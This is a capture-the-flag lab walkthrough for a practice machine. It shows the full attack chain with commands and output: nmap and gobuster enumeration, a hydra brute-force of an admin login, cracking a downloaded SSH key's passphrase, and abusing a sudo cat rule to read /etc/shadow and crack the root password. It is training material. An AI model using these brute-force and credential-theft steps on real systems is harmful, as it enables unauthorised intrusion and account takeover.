- Here, I'll take you through what you need to breeze through this room. It's pretty straightforward—you'll use tools like nmap, gobuster, hydra, and just need some basic know-how with RSA keys and Linux privilege escalation.

-  We’ll start this challenge with an nmap scan which will usually be our first action.
```shell
$ nmap -sC -sV 10.10.62.20
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

 - We only find the Apache2 default page when we put the IP in our browser.
     - We can see the Apache2 Ubuntu Default Page.
     - We didn't find any usefull stuff here.

- Next we’re going to run a Gobuster scan with our chosen directory list in order to find any hidden directories on the website.
```
$ gobuster dir -u http://10.10.148.67/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.148.67/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.148.67/admin/]
```
 
- When we go to that directory in our browser, we are faced with a simple login form.
 ![[Pasted image 20240711110013.png]]!

- Let’s check the source of the page in case there’s anything there that can help us.
![[Pasted image 20240711115339.png]]
- So here we can see the user name which is "admin"

- Now we have to use hydra for grab the password of the login page 
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt <machine ip> http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -t 64 -V

[80][http-post-form] host: 10.10.62.20   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
```
- Here we can see the password.
- Now let's login.

![[Pasted image 20240711121438.png]]
- So here we got the RSA key.
- Also we can see the web flag

- We can follow the link to the RSA key and use wget to download it to our machine.
```
$ wget http://10.10.62.20/admin/panel/id_rsa > john.id_rsa
Connecting to 10.10.62.20:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: ‘id_rsa.1’

id_rsa.1                      100%[==============================================>]   1.72K  --.-KB/s    in 0s      

2024-07-11 12:19:40 (129 MB/s) - ‘id_rsa.1’ saved [1766/1766]
```

- Next, we need to convert the key into a hash format that John the Ripper can work with by using ssh2john.
```
$ python3 /usr/share/john/ssh2john.py id_rsa > key.txt
```

- Then we can run the hash file through John and receive the passphrase for the RSA key.
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt key.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

rockinroll       (id_rsa)

1g 0:00:00:00 DONE (2024-07-11 10:14) 12.50g/s 908000p/s 908000c/s 908000C/s saloni..rashon
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- So we got the password, now lets login as a user.
```
 $ ssh -i id_rsa john@10.10.148.67
The authenticity of host '10.10.148.67 (10.10.148.67)' can't be established.
ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.148.67' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

```

- Let's grab the user flag.
```
john@bruteit:~$ cat user.txt
THM{**********************}
```

- It’s time to find a way to get root access.
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

- Let’s look that up on GTFOBins.
- We find out that we can exploit this in order to read a file.
```
john@bruteit:/home$ cd 
john@bruteit:~$ cd ../..
john@bruteit:/$ LFILELFILE^C
john@bruteit:/$ LFILE=/etc/shadow
john@bruteit:/$ sudo cat "$LFILE"
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

- I think we also have to read the /etc/passwd.
```
john@bruteit:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

- Now we create two files in .txt format (shadow, passwd) we need for the unshadow command.
```
$ unshadow passwd.txt shadow.txt > boss.txt
```

- Again we use john for getting the root password. 
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt boss.txt    
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
--------------------------------------------------------------------------------
```

- Now just simply login as a root.
```
john@bruteit:/$ su root
Password: 
root@bruteit:/# cd /root
root@bruteit:~# ls
root.txt
THM{**********************}
```

***Thanks to everyone who took the time to read my write-up. I hope you found it helpful and informative.***

 Myself 'Indranil Sen',  AKA 'HckN1L'
   [X]( https://x.com/HckN1L) , [linkedIn](https://www.linkedin.com/in/indranil-sen-a1888a256)
	